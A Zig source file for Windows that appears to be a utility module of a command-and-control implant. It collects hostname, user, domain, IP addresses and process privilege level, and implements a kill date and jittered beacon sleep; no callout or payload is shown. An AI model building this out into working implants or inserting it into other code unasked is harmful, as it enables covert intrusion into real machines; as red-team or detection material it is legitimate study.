const std = @import("std");
const win = @import("win32.zig");
const windows = std.os.windows;

fn nx_wide_to_utf8(allocator: std.mem.Allocator, wide: []const u16) ![]u8 {
    var end = wide.len;
    while (end > 0 and wide[end - 1] == 0) : (end -= 1) {}
    return std.unicode.utf16LeToUtf8Alloc(allocator, wide[0..end]);
}

pub fn nx_hostname(allocator: std.mem.Allocator) ![]u8 {
    var buf: [256]u16 = undefined;
    var len: u32 = buf.len;
    if (win.GetComputerNameW(&buf, &len).toBool()) {
        return nx_wide_to_utf8(allocator, buf[0..len]);
    }
    return allocator.dupe(u8, "");
}

pub fn nx_username(allocator: std.mem.Allocator) ![]u8 {
    var buf: [256]u16 = undefined;
    var len: u32 = buf.len;
    if (win.GetUserNameW(&buf, &len).toBool()) {
        return nx_wide_to_utf8(allocator, buf[0..len]);
    }
    return allocator.dupe(u8, "");
}

pub fn nx_current_dir(allocator: std.mem.Allocator) ![]u8 {
    var buf: [windows.MAX_PATH]u16 = undefined;
    const len = win.GetCurrentDirectoryW(buf.len, &buf);
    if (len == 0 or len >= buf.len) return allocator.dupe(u8, "");
    return nx_wide_to_utf8(allocator, buf[0..len]);
}

pub fn nx_set_current_dir(allocator: std.mem.Allocator, path: []const u8) !bool {
    const wide = try std.unicode.utf8ToUtf16LeAllocZ(allocator, path);
    return win.SetCurrentDirectoryW(wide.ptr).toBool();
}

pub fn nx_ipv4_addresses(allocator: std.mem.Allocator) ![][]const u8 {
    var result: std.ArrayList([]const u8) = .empty;
    errdefer result.deinit(allocator);

    var size: win.DWORD = 0;
    _ = win.GetIpAddrTable(null, &size, win.BOOL.FALSE);
    if (size == 0) return result.toOwnedSlice(allocator);

    const buffer = try allocator.alignedAlloc(u8, std.mem.Alignment.of(win.MIB_IPADDRTABLE), size);
    defer allocator.free(buffer);
    const table: *win.MIB_IPADDRTABLE = @ptrCast(@alignCast(buffer.ptr));
    if (win.GetIpAddrTable(table, &size, win.BOOL.FALSE) != 0)
        return result.toOwnedSlice(allocator);

    const rows: [*]win.MIB_IPADDRROW = @ptrCast(&table.table);
    var i: usize = 0;
    while (i < table.dwNumEntries) : (i += 1) {
        const row = rows[i];
        if ((row.wType & 0x0008) != 0) continue; // disconnected
        const a = row.dwAddr & 0xff;
        const b = (row.dwAddr >> 8) & 0xff;
        const c = (row.dwAddr >> 16) & 0xff;
        const d = (row.dwAddr >> 24) & 0xff;
        if (a == 0 or a == 127) continue;
        const text = try std.fmt.allocPrint(allocator, "{d}.{d}.{d}.{d}", .{ a, b, c, d });
        try result.append(allocator, text);
    }
    return result.toOwnedSlice(allocator);
}

pub fn nx_domain(allocator: std.mem.Allocator) ![]u8 {
    const name = std.unicode.utf8ToUtf16LeStringLiteral("USERDOMAIN");
    var buf: [256]u16 = undefined;
    const len = win.GetEnvironmentVariableW(name.ptr, &buf, buf.len);
    if (len == 0) return allocator.dupe(u8, "");
    return nx_wide_to_utf8(allocator, buf[0..@min(len, buf.len - 1)]);
}

pub fn nx_current_pid() u32 {
    return windows.GetCurrentProcessId();
}

pub fn nx_integrity_level() i64 {
    var token: win.HANDLE = undefined;
    if (!win.OpenProcessToken(win.GetCurrentProcess(), win.TOKEN_QUERY, &token).toBool())
        return 2;
    defer _ = win.CloseHandle(token);

    var user_buf: [512]u8 align(@alignOf(win.TOKEN_USER)) = undefined;
    var user_len: win.DWORD = 0;
    _ = win.GetTokenInformation(token, .TokenUser, null, 0, &user_len);
    if (user_len > 0 and user_len <= user_buf.len) {
        if (win.GetTokenInformation(token, .TokenUser, &user_buf, user_len, &user_len).toBool()) {
            const user: *win.TOKEN_USER = @ptrCast(@alignCast(&user_buf));
            if (win.IsWellKnownSid(user.User.Sid, win.WinLocalSystemSid).toBool())
                return 4;
        }
    }

    var elevation: win.TOKEN_ELEVATION = .{ .TokenIsElevated = 0 };
    var elevation_len: win.DWORD = @sizeOf(win.TOKEN_ELEVATION);
    if (win.GetTokenInformation(
        token,
        .TokenElevation,
        &elevation,
        elevation_len,
        &elevation_len,
    ).toBool() and elevation.TokenIsElevated != 0) {
        return 3;
    }
    return 2;
}

pub fn nx_kill_date_reached(kill_date: u32) bool {
    if (kill_date == 0) return false;
    var st: win.SYSTEMTIME = undefined;
    win.GetSystemTime(&st);
    const today: u32 = @as(u32, st.wYear) * 10000 + @as(u32, st.wMonth) * 100 + st.wDay;
    return today > kill_date;
}

pub fn nx_jittered_ms(interval_seconds: u32, jitter_percent: u32) u32 {
    if (interval_seconds == 0) return 0;
    const base_ms: u64 = @as(u64, interval_seconds) * 1000;
    const jitter = @min(jitter_percent, 100);
    const range: u64 = base_ms * jitter / 100;
    var actual = base_ms;
    if (range > 0) {
        var seed = win.GetTickCount64();
        seed = seed *% 6364136223846793005 +% 1442695040888963407;
        actual = base_ms - range + (seed % (2 * range + 1));
    }
    if (actual < 100) actual = 100;
    if (actual > std.math.maxInt(u32)) actual = std.math.maxInt(u32);
    return @intCast(actual);
}

pub fn nx_sleep_with_jitter(interval_seconds: u32, jitter_percent: u32) void {
    const ms = nx_jittered_ms(interval_seconds, jitter_percent);
    if (ms > 0) win.Sleep(ms);
}

pub fn nx_sleep_plain(ms: u32) void {
    win.Sleep(ms);
}
